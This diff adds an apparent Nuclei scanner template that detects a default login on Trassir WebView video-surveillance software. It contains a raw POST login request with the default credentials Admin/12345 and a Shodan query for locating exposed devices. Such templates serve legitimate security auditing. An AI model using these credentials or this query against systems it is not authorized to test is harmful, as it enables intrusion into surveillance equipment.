@@ -1,0 +1,54 @@
+http:
+- attack: clusterbomb
+  matchers:
+  - case-insensitive: true
+    condition: and
+    part: body
+    type: word
+    words:
+    - '"success" :'
+    - '"sid" :'
+  - part: header
+    type: word
+    words:
+    - application/json
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    password:
+    - 12345
+    username:
+    - Admin
+  raw:
+  - 'POST /login HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    username={{username}}&password={{password}}
+
+    '
+  stop-at-first-match: true
+id: trassir-default-login
+info:
+  author: gtrrnr,metascan
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  description: 'Trassir WebView contains a default login vulnerability. An attacker
+    can obtain access to user accounts and access sensitive information, modify data,
+    and/or execute unauthorized operations.
+
+    '
+  metadata:
+    max-request: 1
+    shodan-query: title:"Trassir Webview"
+    verified: true
+  name: Trassir WebView Default Login - Detect
+  reference:
+  - https://confluence.trassir.com/display/TKB/How+to+reset+the+administrator+password+on+the+TRASSIR+NVR
+  severity: high
+  tags: default-login,trassir,webview,vuln
